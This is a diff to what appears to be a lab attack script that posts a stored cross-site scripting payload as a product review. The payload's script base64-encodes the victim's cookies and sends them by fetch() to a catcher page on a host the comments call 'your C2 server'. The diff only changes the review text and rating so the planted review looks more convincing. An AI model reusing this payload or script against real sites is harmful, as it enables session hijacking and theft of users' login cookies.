@@ -13,7 +13,7 @@ PASSWORD = "hucker123"
 # --- XSS Payload ---
 # The code that steals the cookie and sends it to your C2 server
 PAYLOAD = """
-Great product! <script>
+The handle gets too hot, and there's a weird smell.<script>
     var encoded = btoa(document.cookie);
     fetch('http://192.168.56.1/CyberProject/AttackerServer/catcher.php?data=' + encoded);
 </script>
@@ -40,7 +40,7 @@ def perform_stored_xss():
     print(f"[*] Step 2: Injecting Stored XSS into product page...")
     
     review_data = {
-        "rating": "5",
+        "rating": "2",
         "content": PAYLOAD,
         "submit_review": ""
     }
